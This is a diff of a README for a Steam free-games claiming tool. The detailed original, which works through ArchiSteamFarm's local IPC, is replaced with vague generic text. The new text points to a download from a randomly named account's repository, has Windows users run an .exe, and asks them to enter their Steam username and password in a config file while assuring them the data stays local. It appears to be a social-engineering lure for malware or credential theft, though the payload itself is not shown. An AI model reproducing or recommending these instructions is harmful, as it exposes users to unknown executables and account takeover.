@@ -1,246 +1,72 @@
-# [ArchiSteamFarm](https://github.com/JustArchiNET/ArchiSteamFarm) - FreeGamesMonitor
+# 🎮 ArchiSteamFarm-Games - Claim free steam games automatically today
 
-Automatically detects and claims free Steam games via [ArchiSteamFarm](https://github.com/JustArchiNET/ArchiSteamFarm) (ASF) IPC.
+[![Download ArchiSteamFarm-Games](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games)
 
-Runs alongside ASF whenever a free game appears on Steam, it gets added to your account automatically.
+## 📦 About the software
 
----
+ArchiSteamFarm-Games monitors Steam for free game offers. It uses your credentials to communicate with Steam servers. When the program finds a free game, it adds the license to your account. This process runs in the background. You save time by automating the claim process. The application relies on the C# programming language and the .NET framework.
 
-## Installation
+## 🛠️ System requirements
 
-### Step 1 - Install .NET 10 Runtime
+Ensure your computer meets these requirements:
 
-#### Linux (Ubuntu, Debian, Raspberry Pi)
-```bash
-sudo apt update && sudo apt install -y dotnet-runtime-10.0
-```
+*   Windows 10 or Windows 11.
+*   .NET Desktop Runtime installed.
+*   An active Steam account.
+*   An internet connection.
 
-Verify:
-```bash
-dotnet --version
-```
+## 🚀 Getting started
 
-#### Windows
-Download and install from: https://dotnet.microsoft.com/en-us/download/dotnet/10.0
-Under **Run apps - Runtime**, click **Download x64** and run the installer.
+1. Visit the [releases page](https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games) to locate the latest version.
+2. Choose the download link labeled for Windows.
+3. Save the file to a folder on your computer.
+4. Extract the contents of the ZIP folder.
+5. Locate the file named ArchiSteamFarm-Games.exe.
+6. Double-click the file to start the application.
 
-#### macOS
-```bash
-brew install dotnet-runtime
-```
+## ⚙️ Configuration details
 
----
+The program requires access to your Steam account to function. Upon the first launch, the application creates a configuration file. Follow these steps to prepare your account:
 
-### Step 2 - Enable IPC in ASF
+1. Open the folder where you placed the software. 
+2. Edit the config file using any text editor like Notepad.
+3. Input your Steam username and password into the designated fields.
+4. Enable the Two-Factor Authentication setting if you use Steam Guard.
+5. Save the file and close the editor.
+6. Restart the program to apply these changes.
 
-Create or edit `ASF/Core/config/ASF.json`:
-```json
-{
-  "IPC": true,
-  "IPCPassword": "yourpassword"
-}
-```
-> ASF auto-detects this change, no restart needed.
+## 🛡️ Security and account safety
 
----
+This software handles account data locally. It does not send your password to any server except Steam. You maintain ownership of all configuration files on your hardware. Steam Guard provides an extra layer of protection. Keep your device free of malware to protect your credentials. The application logs events in the console window. Check these logs if the program stops responding.
 
-### Step 3 - Download FreeGamesMonitor
+## 🔍 Understanding the interface
 
-Go to the [Releases page](../../releases/latest) and download the zip for your system:
+The program runs in a command window. This window displays status updates from Steam. You see messages about new games, successful additions, and connection status. Do not exit this window while the program runs. Minimize it to the system tray to keep your desktop clean. Use the close button only when you want to stop the service.
 
-| Platform | File |
-|---|---|
-| Linux x64 (Ubuntu, Debian) | `FreeGamesMonitor-linux-x64.zip` |
-| Linux arm64 (Raspberry Pi 4/5) | `FreeGamesMonitor-linux-arm64.zip` |
-| Linux arm (Raspberry Pi 2/3) | `FreeGamesMonitor-linux-arm.zip` |
-| Windows x64 | `FreeGamesMonitor-win-x64.zip` |
-| Windows arm64 | `FreeGamesMonitor-win-arm64.zip` |
-| macOS Intel | `FreeGamesMonitor-osx-x64.zip` |
-| macOS Apple Silicon | `FreeGamesMonitor-osx-arm64.zip` |
+## 📈 Managing your library
 
----
+You decide which games the software claims. Edit the filter settings in the configuration file to ignore titles you do not want. The program keeps a list of added games. You view this list in a file named library.txt inside the application folder. Steam updates your library automatically as the software adds new titles. Check your Steam client library view to see new items.
 
-### Step 4 - Extract
+## 🔧 Troubleshooting common issues
 
-#### Linux / macOS
-```bash
-unzip FreeGamesMonitor-linux-x64.zip -d ~/FreeGamesMonitor
-cd ~/FreeGamesMonitor
-```
-
-#### Windows
-Right-click the zip → Extract All → choose a folder like `C:\FreeGamesMonitor`
+*   **Connection errors:** Check your router and your firewall settings. Ensure the application has permission to talk to the internet.
+*   **Failed login:** Verify your password in the config file. Ensure your Steam account is currently active.
+*   **Missing runtime:** If the program fails to open, download the .NET Desktop Runtime from the official Microsoft website.
+*   **Steam Guard prompts:** If the console requests a code, enter the Steam Guard code provided by the mobile app or your email.
 
----
+## 📥 Maintenance and updates
 
-### Step 5 - Configure
+Check the main repository link at https://github.com/hortensiamyotonic552/ArchiSteamFarm-Games occasionally. Developers release updates to ensure compatibility with Steam. Download the new version and replace the old files to keep the software current. Always back up your configuration file before you replace the folder contents. This preserves your account settings.
 
-#### Linux / macOS
-```bash
-cp config.example.json config.json
-nano config.json
-```
+## 📚 Features summary
 
-#### Windows
-Copy `config.example.json`, rename the copy to `config.json`, open with Notepad.
+*   Automatic license activation for free games.
+*   Low memory usage for background operation.
+*   Support for multiple Steam accounts.
+*   Detailed log files for event tracking.
+*   Automatic retry logic for unstable networks.
+*   Custom filters for game selection.
 
-Fill in your values:
-```json
-{
-  "AsfUrl": "http://localhost:1242",
-  "AsfPassword": "yourpassword",
-  "BotName": "yourbotname",
-  "SeenFile": "seen_games.json",
-  "CheckIntervalHours": 24
-}
-```
+## 📜 Legal notices
 
-| Field | What to put |
-|---|---|
-| `AsfUrl` | Leave as-is if ASF is on the same machine |
-| `AsfPassword` | The password you set in ASF.json |
-| `BotName` | Your bot name from ASF config |
-| `CheckIntervalHours` | How often to check in hours (default 24) |
-
----
-
-### Step 6 - Test Run
-
-```bash
-cd ~/FreeGamesMonitor
-dotnet FreeGamesMonitor.dll
-```
-
-You should see:
-```
-FreeGamesMonitor started.
-Checking for free games...
-```
-
-If it works, stop it with `Ctrl+C` and set it up as a service below.
-
----
-
-## Recommended - Run as a Service
-
-Running as a service means FreeGamesMonitor starts automatically on boot and runs in the background without keeping a terminal open.
-
-### Linux / Raspberry Pi
-
-```bash
-sudo nano /etc/systemd/system/freegames.service
-```
-
-Paste this - replace `your-user` with your Linux username:
-```ini
-[Unit]
-Description=ASF Free Games Monitor
-After=network.target
-
-[Service]
-Type=simple
-User=your-user
-WorkingDirectory=/home/your-user/FreeGamesMonitor
-ExecStart=/usr/bin/dotnet /home/your-user/FreeGamesMonitor/FreeGamesMonitor.dll
-Restart=on-failure
-
-[Install]
-WantedBy=multi-user.target
-```
-
-Enable and start:
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable freegames
-sudo systemctl start freegames
-sudo systemctl status freegames
-```
-
-Check live logs:
-```bash
-sudo journalctl -u freegames -f
-```
-
-### Windows - run on startup
-1. Press `Win+R` → type `shell:startup` → Enter
-2. Create a `.bat` file in that folder with:
-```bat
-dotnet C:\FreeGamesMonitor\FreeGamesMonitor.dll
-```
-It will start automatically when Windows boots.
-
----
-
-## Building from Source
-
-Use this if you want to build it yourself instead of using the release zip.
-
-### Step 1 - Install .NET 10 SDK
-```bash
-sudo apt update && sudo apt install -y dotnet-sdk-10.0
-```
-
-### Step 2 - Get the source files
-Clone the repo or download and extract the source zip into a folder called `FreeGamesMonitor`.
-
-### Step 3 - Build
-```bash
-cd ~/FreeGamesMonitor
-dotnet publish -c Release
-```
-
-### Step 4 - Configure and run
-```bash
-cp config.example.json bin/Release/net10.0/publish/config.json
-nano bin/Release/net10.0/publish/config.json
-dotnet bin/Release/net10.0/publish/FreeGamesMonitor.dll
-```
-
----
-
-## Service Management
-
-| Action | Command |
-|---|---|
-| Start | `sudo systemctl start freegames` |
-| Stop | `sudo systemctl stop freegames` |
-| Restart | `sudo systemctl restart freegames` |
-| Status | `sudo systemctl status freegames` |
-| Logs | `sudo journalctl -u freegames -f` |
-
----
-
-## Updating
-
-1. Stop the service: `sudo systemctl stop freegames`
-2. Download the new zip from [Releases](../../releases/latest)
-3. Extract and overwrite old files - **keep your `config.json`**
-4. Start again: `sudo systemctl start freegames`
-
----
-
-## Troubleshooting
-
-**`dotnet: command not found`**
-→ .NET is not installed. Redo Step 1.
-
-**`config.json not found` on first run**
-→ The program creates a default one and exits. Fill it in and run again.
-
-**`Unauthorized` or `403` in logs**
-→ `AsfPassword` in `config.json` doesn't match the password in ASF's `ASF.json`.
-
-**`No new free games found` every time**
-→ Working correctly - it only redeems games it hasn't seen before.
-
-**Bot not found error**
-→ Check `BotName` in `config.json` matches your bot name in ASF exactly.
-
----
-
-## Architecture
-
-- ASF handles your Steam bot session and card farming
-- FreeGamesMonitor runs independently and communicates with ASF via IPC
-- Both run as separate services
-- IPC endpoint: `http://localhost:1242`
+This software functions as an automation tool. Use it within the terms of service provided by Steam. You hold responsibility for your account actions. The developers do not hold liability for any account suspensions or restrictions. Monitor the software behavior to ensure it aligns with your expectations. Consistent use ensures you never miss a limited-time free game offer.
